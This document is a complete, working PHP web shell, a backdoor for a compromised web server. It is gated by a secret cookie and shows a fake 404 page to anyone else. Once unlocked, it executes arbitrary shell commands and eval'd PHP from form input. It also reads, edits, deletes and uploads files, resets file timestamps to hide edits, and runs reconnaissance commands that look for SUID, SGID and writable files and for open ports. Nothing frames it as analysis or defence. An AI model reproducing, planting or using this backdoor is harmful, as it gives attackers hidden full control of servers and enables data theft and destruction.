<?php if(md5($_COOKIE['qwerty'])=="7f529a50527b11c613934ff6568ce5ec"){
clearstatcache();
set_magic_quotes_runtime(0);
if(!function_exists('ini_set')){
function ini_set(){
return FALSE;
}
}
ini_set('output_buffering',0);
if(@set_time_limit(0) || ini_set('max_execution_time', 0)) $limit = 'not limited';
else $limit = get_cfg_var('max_execution_time');

if(isset($HTTP_SERVER_VARS) && !isset($_SERVER)){
$_POST = &$HTTP_POST_VARS;
$_GET = &$HTTP_GET_VARS;
$_SERVER = &$HTTP_SERVER_VARS;
}

if(@get_magic_quotes_gpc()){
foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
foreach($_SERVER as $k=>$v) $_SERVER[$k] = stripslashes($v);
}

function execute($c){
if(function_exists('exec')){
@exec($c, $out);
return @implode("\n", $out);
}elseif(function_exists('shell_exec')){
$out = @shell_exec($c);
return $out;
}elseif(function_exists('system')){
@ob_start();
@system($c, $ret);
$out = @ob_get_contents();
@ob_end_clean();
return $out;
}elseif(function_exists('passthru')){
@ob_start();
@passthru($c, $ret);
$out = @ob_get_contents();
@ob_end_clean();
return $out;
}else{
return FALSE;
}
}

function read($f){
$str = @file($f);
if($str){
$out = implode('', $str);
}elseif(function_exists('curl_version')){
@ob_start();
$h = @curl_init('file:/'.'/'.$f);
@curl_exec($h);
$out = @ob_get_contents();
@ob_end_clean();
}else{
$out = 'Could not read file!';
}
return htmlspecialchars($out);
}

function write($f, $c){
$t = filemtime($f);
$fp = @fopen($f, 'w');
if($fp){
fwrite($fp, $c);
fclose($fp);
$out = 'File saved.'."\n";
if($t && touch($f, $t)){
$out .= 'Last modification time changed.';
}else{
$out .= 'Could not change last modification time!';
}
}else{
$out = 'Saving failed!';
}
return $out;
}

function file_size($f){
$size = filesize($f);
if($size < 1024) $size = $size.'&nbsp;b';
elseif($size < 1048576) $size = round($size/1024*100)/100 . '&nbsp;Kb';
elseif($size < 1073741824) $size=round($size/1048576*100)/100 . '&nbsp;Mb';
return $size;
}

if(!function_exists('natcasesort')){
function natcasesort($arr){
return sort($arr);
}
}

if(!empty($_POST['dir'])){
$dir = $_POST['dir'];
if(!@chdir($dir)) $out = 'chdir() failled!';
}
$dir = getcwd();



(strlen($dir) > 1 && $dir[1] == ':') ? $os_type = 'win' : $os_type = 'nix';

if(!$os_name = @php_uname()){
if(function_exists('posix_uname')){
$os_name = posix_uname();
}elseif($os_name != getenv('OS')){
$os_name = '';
}
}

if(function_exists('posix_getpwuid')){
$data = posix_getpwuid(posix_getuid());
$user = $data['name'].' uid('.$data['uid'].') gid('.$data['gid'].')';
}else{
$user = '';
}

$safe_mode = get_cfg_var('safe_mode');
$safe_mode ? $safe = 'on' : $safe = 'off';

execute('echo ssps') ? $execute = 'on' : $execute = 'off';




$server = getenv('SERVER_SOFTWARE');
if(!$server) $server = '---';



$out = '';
$tail = '';
$aliases = '';
if(!$safe_mode){
if($os_type == 'nix'){
$os .= execute('sysctl -n kern.ostype');
$os .= execute('sysctl -n kern.osrelease');
$os .= execute('sysctl -n kernel.ostype');
$os .= execute('sysctl -n kernel.osrelease');
if(empty($user)) $user = execute('id');
$aliases = array(
'' => '',
'find suid files'=>'find / -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'show opened ports'=>'netstat -an | grep -i listen',
);
}else{
$os_name .= execute('ver');
$user .= execute('echo %username%');
$aliases = array(
'' => '',
'show runing services' => 'net start',
'show process list' => 'tasklist'
);
}
}



if(!empty($_POST['cmd'])){
$out = execute($_POST['cmd']);
}

elseif(!empty($_POST['php'])){
ob_start();
eval($_POST['php']);
$out = ob_get_contents();
ob_end_clean();
}

elseif(!empty($_POST['edit'])){
$file = $_POST['edit'];
$out = read($file);
$tail = '<input type=hidden name=dir value="'.$dir.'"><input type=hidden name=efile value="'.$file.'"><br><input type=submit>';
}

elseif(!empty($_POST['save'])){
$out = write($_POST['efile'], $_POST['save']);
}

elseif(!empty($_POST['remove'])){
$obj = $_POST['remove'];
@is_dir($obj) ? $res = @rmdir($obj) : $res = @unlink($obj);
$res ? $out = 'Removed successfully' : $out = 'Removing failed!';
}

elseif(!empty($_POST['newdir'])){
@mkdir($_POST['newdir']) ? $out = 'Directory created.' : $out = 'Could not create directory!';
}

elseif(!empty($_POST['newfile'])){
@touch($_POST['newfile']) ? $out = 'File created.' : $out = 'Could not create file!';
}

elseif(!empty($_POST['alias'])){
$out = execute($_POST['alias']);
}

elseif(!empty($_FILES['ufile']['tmp_name'])){
if(!is_uploaded_file($_FILES['ufile']['tmp_name']) || @!copy($_FILES['ufile']['tmp_name'],$dir.chr(47).$_FILES['ufile']['name'])) $out = 'Could not upload file';
else $out = 'Uploaded successfully.';
}

print<<<here
<style>
table {font:9pt Tahoma;border-color:white}
input,select,file {background-color:#eeeeee}
textarea {background-color:#f2f2f2}
</style>
<br>
<center>
<table cellpadding=1 cellspacing=0 border=1 width=650 bgcolor=silver>
<tr>
<td>
<form method=post>
<table cellpadding=1 cellspacing=0 border=1 width=650>
here;
if(!$safe_mode) print<<<here
<tr>
<td>
cmd
</td>
<td colspan=8>
<input type=text name=cmd size=97>
</td>
</tr>
here;
print<<<here
<tr>
<td>
php
</td>
<td colspan=8>
<input type=text name=php size=97>
</td>
</tr>
<tr>
<td>
actions
</td>
<td>
edit
</td>
<td>
<input type=text name=edit size=14>
</td>
<td>
remove
</td>
<td>
<input type=text name=remove size=14>
</td>
<td>
new_dir
</td>
<td>
<input type=text name=newdir size=14>
</td>
<td>
new_file
</td>
<td>
<input type=text name=newfile size=15>
</td>
</tr>
here;
if($aliases){
print<<<here
<tr>
<td>
aliases
</td>
<td colspan=8>
<select name=alias>
here;
foreach($aliases as $k => $v){
print '<option value="'.$v.'">'.$k.'</option>';
}
print<<<here


</select>
<input type=submit>
</td>
</tr>
here;
}
print<<<here
<tr>
<td>
dir
</td>
<td colspan=8>
<input type=text value="{$dir}" name=dir size=97>
</td>
</tr>
</form>
<form method=post enctype=multipart/form-data>
<tr>
<td>
upload
</td>
<td colspan=8>
<input type=file name=ufile size=76>
<input type=hidden name=dir value="{$dir}">
<input type=submit>
</td>
</tr>
</form>
</table>



<table cellpadding=0 cellspacing=0 border=1 width=650>
<form method=post>
<tr valign=top>
<td width=70% bgcolor=#dddddd>
<b>OS:</b> {$os_name}<br>
<b>User:</b> {$user}<br>
<b>Server:</b> {$server}<br>
<b>safe_mode:</b> {$safe} <b>execute:</b> {$execute} <b>max_execution_time:</b> {$limit}
</td>
<td rowspan=2 bgcolor=#dddddd>
<center>~:(expl0rer):~</center>
here;



if($dp = @openDir($dir)){
$cObj = readDir($dp);
while($cObj){
if(@is_dir($cObj)) $theDirs[] = $cObj;
elseif(@is_file($cObj)) $theFiles[] = $cObj;
$cObj = readDir($dp);
}
closedir($dp);
}

if(!empty($theDirs)){
natcasesort($theDirs);
if($os_type == 'nix'){
foreach($theDirs as $cDir){
$color='black';
if(is_writeable($cDir)){
$color='red';
}elseif(is_readable($cDir)){
$color='blue';
}
print "<font color=".$color.">&lt;".$cDir."&gt;</font><br>";
}
}else{
foreach($theDirs as $cDir){
$tmp = $cDir.'/.ssps_tmp';
if(@touch($tmp)){
$color='red';
unlink($tmp);
}elseif(opendir($cDir)){
closedir();
$color='blue';
}else{
$color='black';
}
print "<font color=".$color.">&lt;".$cDir."&gt;</font><br>";
}
}
} else print '<br>open_basedir restriction in effect. Allowed path is '.get_cfg_var('open_basedir');

print '<br>';

if(!empty($theFiles)){
natcasesort($theFiles);
print '<table width=100% border=0 cellpadding=0 cellspacing=2 style="font:8pt Tahoma;">';
foreach($theFiles as $cFile){
$size = file_size($cFile);
if($fp = @fopen($cFile, 'a')) $color = 'red';
elseif($fp = @fopen($cFile, 'r')) $color='blue';
else $color = 'black';
@fclose($fp);
print '<tr><td width=100%><font color='.$color.'>'.$cFile.'</font></td><td align=left>'.$size.'</tr>';
}
print '</table>';
}

print<<<here
</td>
</tr>
<tr valign=top>
<td align=center>
<form method=post>
~:(results):~
<textarea name=save cols=55 rows=15>{$out}</textarea>
{$tail}
</form>
</td>
</tr>

</table>
</form>
</td>
</tr>
</table>
here;
die;
}else{
header("HTTP/1.1 404 Not Found");
header("Connection: close");
echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server</p>
<hr>
<address>".(($_SERVER['SERVER_SIGNATURE']!="")?$_SERVER['SERVER_SIGNATURE']:($_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_NAME']." Port ".$_SERVER['SERVER_PORT']))."</address>
</body></html>"; }
?>